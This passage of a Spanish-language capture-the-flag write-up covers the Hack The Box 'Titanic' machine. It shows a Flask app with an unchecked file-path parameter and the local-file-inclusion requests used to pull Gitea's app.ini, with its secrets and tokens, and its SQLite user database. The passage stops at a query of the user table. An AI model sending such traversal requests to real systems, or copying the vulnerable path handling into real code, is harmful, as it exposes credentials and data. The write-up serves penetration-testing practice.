+Docker compose para la base de datos y su password;</p></div><div class="el-pre"><pre class="language-d" tabindex="0"><code data-line="0" class="language-d is-loaded"><span class="token keyword">version</span><span class="token punctuation">:</span> '<span class="token number">3.8</span>'
+
+services<span class="token punctuation">:</span>
+  mysql<span class="token punctuation">:</span>
+    image<span class="token punctuation">:</span> mysql<span class="token punctuation">:</span><span class="token number">8.0</span>
+    container_name<span class="token punctuation">:</span> mysql
+    ports<span class="token punctuation">:</span>
+      <span class="token operator">-</span> <span class="token string">"127.0.0.1:3306:3306"</span>
+    environment<span class="token punctuation">:</span>
+      MYSQL_ROOT_PASSWORD<span class="token punctuation">:</span> 'MySQLP@<span class="token keyword">$</span><span class="token keyword">$</span>w0rd<span class="token operator">!</span>'
+      MYSQL_DATABASE<span class="token punctuation">:</span> tickets 
+      MYSQL_USER<span class="token punctuation">:</span> sql_svc
+      MYSQL_PASSWORD<span class="token punctuation">:</span> sql_password
+    restart<span class="token punctuation">:</span> always
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Vemos que la base de datos esta corriendo en el puerto 3306 pero no tenemos acceso de momento;</p></div></div></div><div class="el-h5 heading-wrapper"><h5 data-heading="Gitea" dir="auto" class="heading" id="Gitea"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Gitea</h5><div class="heading-children"><div class="el-pre"><pre class="language-d" tabindex="0"><code data-line="0" class="language-d is-loaded"><span class="token keyword">version</span><span class="token punctuation">:</span> <span class="token char">'3'</span>
+
+services<span class="token punctuation">:</span>
+  gitea<span class="token punctuation">:</span>
+    image<span class="token punctuation">:</span> gitea<span class="token operator">/</span>gitea
+    container_name<span class="token punctuation">:</span> gitea
+    ports<span class="token punctuation">:</span>
+      <span class="token operator">-</span> <span class="token string">"127.0.0.1:3000:3000"</span>
+      <span class="token operator">-</span> <span class="token string">"127.0.0.1:2222:22"</span>  # Optional <span class="token keyword">for</span> SSH access
+    volumes<span class="token punctuation">:</span>
+      <span class="token operator">-</span> <span class="token operator">/</span>home<span class="token operator">/</span>developer<span class="token operator">/</span>gitea<span class="token operator">/</span>data<span class="token punctuation">:</span><span class="token operator">/</span>data # Replace <span class="token keyword">with</span> your path
+    environment<span class="token punctuation">:</span>
+      <span class="token operator">-</span> USER_UID<span class="token operator">=</span><span class="token number">1000</span>
+      <span class="token operator">-</span> USER_GID<span class="token operator">=</span><span class="token number">1000</span>
+    restart<span class="token punctuation">:</span> always
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Bueno tenemos ruta en local; el /data de gitea esta en <code>/home/developer/gitea/data</code></p></div></div></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="flask-app" dir="auto" class="heading" id="flask-app"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>flask-app</h4><div class="heading-children"><div class="el-p"><p dir="auto">Flask-app es el repositorio para la pagina web del booking de titanic<br>
+<span alt="Pasted image 20250217183543.png" src="Pasted image 20250217183543.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217183543.png" src="machines/titanic/imgs/pasted-image-20250217183543.png"></span></p></div><div class="el-h5 heading-wrapper"><h5 data-heading="App.py" dir="auto" class="heading" id="App.py"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>App.py</h5><div class="heading-children"><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> Response
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> json
+<span class="token keyword">from</span> uuid <span class="token keyword">import</span> uuid4
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+TICKETS_DIR <span class="token operator">=</span> <span class="token string">"tickets"</span>
+
+<span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>TICKETS_DIR<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>TICKETS_DIR<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/book'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">book_ticket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"name"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">"email"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">"phone"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">"date"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">"cabin"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'cabin'</span><span class="token punctuation">]</span>
+    <span class="token punctuation">}</span>
+
+    ticket_id <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    json_filename <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>ticket_id<span class="token punctuation">}</span></span><span class="token string">.json"</span></span>
+    json_filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>TICKETS_DIR<span class="token punctuation">,</span> json_filename<span class="token punctuation">)</span>
+
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>json_filepath<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> json_file<span class="token punctuation">:</span>
+        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">,</span> json_file<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'download_ticket'</span><span class="token punctuation">,</span> ticket<span class="token operator">=</span>json_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">download_ticket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ticket <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'ticket'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> ticket<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Ticket parameter is required"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>
+
+    json_filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>TICKETS_DIR<span class="token punctuation">,</span> ticket<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>json_filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>json_filepath<span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span>ticket<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Ticket not found"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div></div></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="GiteaDB y  Developer password" dir="auto" class="heading" id="GiteaDB_y__Developer_password"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>GiteaDB y  Developer password</h3><div class="heading-children"><div class="el-p"><p dir="auto">A partir del Docker-compose de gitea creo uno en local para observar la estructura de archivos</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">─<span class="token comment"># docker exec -it f4a35e1a9c34 bash</span>
+f4a35e1a9c34:/<span class="token comment"># cd /data/</span>
+f4a35e1a9c34:/data<span class="token comment"># ls</span>
+<span class="token function">git</span>    gitea  <span class="token function">ssh</span>
+f4a35e1a9c34:/data<span class="token comment"># tree .</span>
+<span class="token builtin class-name">.</span>
+├── <span class="token function">git</span>
+├── gitea
+│   ├── conf
+│   │   └── app.ini
+│   └── log
+└── <span class="token function">ssh</span>
+    ├── ssh_host_ecdsa_key
+    ├── ssh_host_ecdsa_key.pub
+    ├── ssh_host_ed25519_key
+    ├── ssh_host_ed25519_key.pub
+    ├── ssh_host_rsa_key
+    └── ssh_host_rsa_key.pub
+
+<span class="token number">5</span> directories, <span class="token number">7</span> files
+f4a35e1a9c34:/data<span class="token comment"># </span>
+
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Si el docker-compose esta corriendo en la maquina podriamos ser capaces de sacar archivos del gitea; probamos a sacar el app.ini en la ruta : <code>/home/developer/gitea/data/gitea/conf/app.ini</code></p></div><div class="el-p"><p dir="auto">Usamos el lfi </p></div><div class="el-pre"><pre class="language-http" tabindex="0"><code data-line="0" class="language-http is-loaded"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded">APP_NAME <span class="token operator">=</span> Gitea<span class="token punctuation">:</span> Git <span class="token keyword">with</span> a cup of tea
+RUN_MODE <span class="token operator">=</span> prod
+RUN_USER <span class="token operator">=</span> git
+WORK_PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea
+
+<span class="token punctuation">[</span>repository<span class="token punctuation">]</span>
+ROOT <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>git<span class="token operator">/</span>repositories
+
+<span class="token punctuation">[</span>repository<span class="token punctuation">.</span>local<span class="token punctuation">]</span>
+LOCAL_COPY_PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>tmp<span class="token operator">/</span>local<span class="token operator">-</span>repo
+
+<span class="token punctuation">[</span>repository<span class="token punctuation">.</span>upload<span class="token punctuation">]</span>
+TEMP_PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>uploads
+
+<span class="token punctuation">[</span>server<span class="token punctuation">]</span>
+APP_DATA_PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea
+DOMAIN <span class="token operator">=</span> gitea<span class="token punctuation">.</span>titanic<span class="token punctuation">.</span>htb
+SSH_DOMAIN <span class="token operator">=</span> gitea<span class="token punctuation">.</span>titanic<span class="token punctuation">.</span>htb
+HTTP_PORT <span class="token operator">=</span> <span class="token number">3000</span>
+ROOT_URL <span class="token operator">=</span> http<span class="token punctuation">:</span><span class="token operator">//</span>gitea<span class="token punctuation">.</span>titanic<span class="token punctuation">.</span>htb<span class="token operator">/</span>
+DISABLE_SSH <span class="token operator">=</span> false
+SSH_PORT <span class="token operator">=</span> <span class="token number">22</span>
+SSH_LISTEN_PORT <span class="token operator">=</span> <span class="token number">22</span>
+LFS_START_SERVER <span class="token operator">=</span> true
+LFS_JWT_SECRET <span class="token operator">=</span> OqnUg<span class="token operator">-</span>uJVK<span class="token operator">-</span>l7rMN1oaR6oTF348gyr0QtkJt<span class="token operator">-</span>JpjSO4
+OFFLINE_MODE <span class="token operator">=</span> true
+
+<span class="token punctuation">[</span>database<span class="token punctuation">]</span>
+PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>gitea<span class="token punctuation">.</span>db
+DB_TYPE <span class="token operator">=</span> sqlite3
+HOST <span class="token operator">=</span> localhost<span class="token punctuation">:</span><span class="token number">3306</span>
+NAME <span class="token operator">=</span> gitea
+USER <span class="token operator">=</span> root
+PASSWD <span class="token operator">=</span> 
+LOG_SQL <span class="token operator">=</span> false
+SCHEMA <span class="token operator">=</span> 
+SSL_MODE <span class="token operator">=</span> disable
+
+<span class="token punctuation">[</span>indexer<span class="token punctuation">]</span>
+ISSUE_INDEXER_PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>indexers<span class="token operator">/</span>issues<span class="token punctuation">.</span>bleve
+
+<span class="token punctuation">[</span>session<span class="token punctuation">]</span>
+PROVIDER_CONFIG <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>sessions
+PROVIDER <span class="token operator">=</span> <span class="token builtin">file</span>
+
+<span class="token punctuation">[</span>picture<span class="token punctuation">]</span>
+AVATAR_UPLOAD_PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>avatars
+REPOSITORY_AVATAR_UPLOAD_PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>repo<span class="token operator">-</span>avatars
+
+<span class="token punctuation">[</span>attachment<span class="token punctuation">]</span>
+PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>attachments
+
+<span class="token punctuation">[</span>log<span class="token punctuation">]</span>
+MODE <span class="token operator">=</span> console
+LEVEL <span class="token operator">=</span> info
+ROOT_PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>gitea<span class="token operator">/</span>log
+
+<span class="token punctuation">[</span>security<span class="token punctuation">]</span>
+INSTALL_LOCK <span class="token operator">=</span> true
+SECRET_KEY <span class="token operator">=</span> 
+REVERSE_PROXY_LIMIT <span class="token operator">=</span> <span class="token number">1</span>
+REVERSE_PROXY_TRUSTED_PROXIES <span class="token operator">=</span> <span class="token operator">*</span>
+INTERNAL_TOKEN <span class="token operator">=</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="token punctuation">.</span>eyJuYmYiOjE3MjI1OTUzMzR9<span class="token punctuation">.</span>X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
+PASSWORD_HASH_ALGO <span class="token operator">=</span> pbkdf2
+
+<span class="token punctuation">[</span>service<span class="token punctuation">]</span>
+DISABLE_REGISTRATION <span class="token operator">=</span> false
+REQUIRE_SIGNIN_VIEW <span class="token operator">=</span> false
+REGISTER_EMAIL_CONFIRM <span class="token operator">=</span> false
+ENABLE_NOTIFY_MAIL <span class="token operator">=</span> false
+ALLOW_ONLY_EXTERNAL_REGISTRATION <span class="token operator">=</span> false
+ENABLE_CAPTCHA <span class="token operator">=</span> false
+DEFAULT_KEEP_EMAIL_PRIVATE <span class="token operator">=</span> false
+DEFAULT_ALLOW_CREATE_ORGANIZATION <span class="token operator">=</span> true
+DEFAULT_ENABLE_TIMETRACKING <span class="token operator">=</span> true
+NO_REPLY_ADDRESS <span class="token operator">=</span> noreply<span class="token punctuation">.</span>localhost
+
+<span class="token punctuation">[</span>lfs<span class="token punctuation">]</span>
+PATH <span class="token operator">=</span> <span class="token operator">/</span>data<span class="token operator">/</span>git<span class="token operator">/</span>lfs
+
+<span class="token punctuation">[</span>mailer<span class="token punctuation">]</span>
+ENABLED <span class="token operator">=</span> false
+
+<span class="token punctuation">[</span>openid<span class="token punctuation">]</span>
+ENABLE_OPENID_SIGNIN <span class="token operator">=</span> true
+ENABLE_OPENID_SIGNUP <span class="token operator">=</span> true
+
+<span class="token punctuation">[</span>cron<span class="token punctuation">.</span>update_checker<span class="token punctuation">]</span>
+ENABLED <span class="token operator">=</span> false
+
+<span class="token punctuation">[</span>repository<span class="token punctuation">.</span>pull<span class="token operator">-</span>request<span class="token punctuation">]</span>
+DEFAULT_MERGE_STYLE <span class="token operator">=</span> merge
+
+<span class="token punctuation">[</span>repository<span class="token punctuation">.</span>signing<span class="token punctuation">]</span>
+DEFAULT_TRUST_MODEL <span class="token operator">=</span> committer
+
+<span class="token punctuation">[</span>oauth2<span class="token punctuation">]</span>
+JWT_SECRET <span class="token operator">=</span> FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
+
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Tenemos la ubicacion de la base de datos! </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token punctuation">[</span>database<span class="token punctuation">]</span>
+<span class="token environment constant">PATH</span> <span class="token operator">=</span> /data/gitea/gitea.db
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Usamos el lfi</p></div><div class="el-pre"><pre class="language-http" tabindex="0"><code data-line="0" class="language-http is-loaded"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre class="language-sqlite" tabindex="0"><code data-line="0" class="language-sqlite is-loaded">sqlite3 gitea.db 
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite&gt; .tables
+access                     oauth2_grant             
+access_token               org_user                 
+action                     package                  
+action_artifact            package_blob             
+action_run                 package_blob_upload      
+action_run_index           package_cleanup_rule     
+action_run_job             package_file             
+action_runner              package_property         
+action_runner_token        package_version          
+action_schedule            project                  
+action_schedule_spec       project_board            
+action_task                project_issue            
+action_task_output         protected_branch         
+action_task_step           protected_tag            
+action_tasks_version       public_key               
+action_variable            pull_auto_merge          
+app_state                  pull_request             
+attachment                 push_mirror              
+auth_token                 reaction                 
+badge                      release                  
+branch                     renamed_branch           
+collaboration              repo_archiver            
+comment                    repo_indexer_status      
+commit_status              repo_redirect            
+commit_status_index        repo_topic               
+commit_status_summary      repo_transfer            
+dbfs_data                  repo_unit                
+dbfs_meta                  repository               
+deploy_key                 review                   
+email_address              review_state             
+email_hash                 secret                   
+external_login_user        session                  
+follow                     star                     
+gpg_key                    stopwatch                
+gpg_key_import             system_setting           
+hook_task                  task                     
+issue                      team                     
+issue_assignees            team_invite              
+issue_content_history      team_repo                
+issue_dependency           team_unit                
+issue_index                team_user                
+issue_label                topic                    
+issue_user                 tracked_time             
+issue_watch                two_factor               
+label                      upload                   
+language_stat              user                     
+lfs_lock                   user_badge               
+lfs_meta_object            user_blocking            
+login_source               user_open_id             
+milestone                  user_redirect            
+mirror                     user_setting             
+notice                     version                  
+notification               watch                    
+oauth2_application         webauthn_credential      
+oauth2_authorization_code  webhook                  
+sqlite&gt; 
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Sacamos la tabla <strong>user</strong>;<br>
+<span alt="Pasted image 20250217184713.png" src="Pasted image 20250217184713.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250217184713.png" src="machines/titanic/imgs/pasted-image-20250217184713.png"></span></p></div><div class="el-pre"><pre class="language-plaintext" tabindex="0"><code data-line="0" class="language-plaintext is-loaded">sqlite&gt; PRAGMA table_info(user);
+0|id|INTEGER|1||1
+1|lower_name|TEXT|1||0
+2|name|TEXT|1||0
+3|full_name|TEXT|0||0
+4|email|TEXT|1||0
+5|keep_email_private|INTEGER|0||0
+6|email_notifications_preference|TEXT|1|'enabled'|0
+7|passwd|TEXT|1||0
+8|passwd_hash_algo|TEXT|1|'argon2'|0
+9|must_change_password|INTEGER|1|0|0
+10|login_type|INTEGER|0||0
+11|login_source|INTEGER|1|0|0
+12|login_name|TEXT|0||0
+13|type|INTEGER|0||0
+14|location|TEXT|0||0
+15|website|TEXT|0||0
+16|rands|TEXT|0||0
+17|salt|TEXT|0||0
+18|language|TEXT|0||0
+19|description|TEXT|0||0
+20|created_unix|INTEGER|0||0
+21|updated_unix|INTEGER|0||0
+22|last_login_unix|INTEGER|0||0
+23|last_repo_visibility|INTEGER|0||0
+24|max_repo_creation|INTEGER|1|-1|0
+25|is_active|INTEGER|0||0
+26|is_admin|INTEGER|0||0
+27|is_restricted|INTEGER|1|0|0
+28|allow_git_hook|INTEGER|0||0
+29|allow_import_local|INTEGER|0||0
+30|allow_create_organization|INTEGER|0|1|0
+31|prohibit_login|INTEGER|1|0|0
+32|avatar|TEXT|1||0
+33|avatar_email|TEXT|1||0
+34|use_custom_avatar|INTEGER|0||0
+35|num_followers|INTEGER|0||0
+36|num_following|INTEGER|1|0|0
+37|num_stars|INTEGER|0||0
+38|num_repos|INTEGER|0||0
+39|num_teams|INTEGER|0||0
+40|num_members|INTEGER|0||0
+41|visibility|INTEGER|1|0|0
+42|repo_admin_change_team_access|INTEGER|1|0|0
+43|diff_view_style|TEXT|1|''|0
+44|theme|TEXT|1|''|0
+45|keep_activity_private|INTEGER|1|0|0
+sqlite&gt; PRAGMA table_info(user);
+0|id|INTEGER|1||1
+1|lower_name|TEXT|1||0
+2|name|TEXT|1||0
+3|full_name|TEXT|0||0
+4|email|TEXT|1||0
+5|keep_email_private|INTEGER|0||0
+6|email_notifications_preference|TEXT|1|'enabled'|0
+7|passwd|TEXT|1||0
+8|passwd_hash_algo|TEXT|1|'argon2'|0
+9|must_change_password|INTEGER|1|0|0
+10|login_type|INTEGER|0||0
+11|login_source|INTEGER|1|0|0
+12|login_name|TEXT|0||0
+13|type|INTEGER|0||0
+14|location|TEXT|0||0
+15|website|TEXT|0||0
+16|rands|TEXT|0||0
+17|salt|TEXT|0||0
+18|language|TEXT|0||0
+19|description|TEXT|0||0
+20|created_unix|INTEGER|0||0
+21|updated_unix|INTEGER|0||0
+22|last_login_unix|INTEGER|0||0
+23|last_repo_visibility|INTEGER|0||0
+24|max_repo_creation|INTEGER|1|-1|0
+25|is_active|INTEGER|0||0
+26|is_admin|INTEGER|0||0
+27|is_restricted|INTEGER|1|0|0
+28|allow_git_hook|INTEGER|0||0
+29|allow_import_local|INTEGER|0||0
+30|allow_create_organization|INTEGER|0|1|0
+31|prohibit_login|INTEGER|1|0|0
+32|avatar|TEXT|1||0
+33|avatar_email|TEXT|1||0
+34|use_custom_avatar|INTEGER|0||0
+35|num_followers|INTEGER|0||0
+36|num_following|INTEGER|1|0|0
+37|num_stars|INTEGER|0||0
+38|num_repos|INTEGER|0||0
+39|num_teams|INTEGER|0||0
+40|num_members|INTEGER|0||0
+41|visibility|INTEGER|1|0|0
+42|repo_admin_change_team_access|INTEGER|1|0|0
+43|diff_view_style|TEXT|1|''|0
+44|theme|TEXT|1|''|0
+45|keep_activity_private|INTEGER|1|0|0
+sqlite&gt; select * from user;
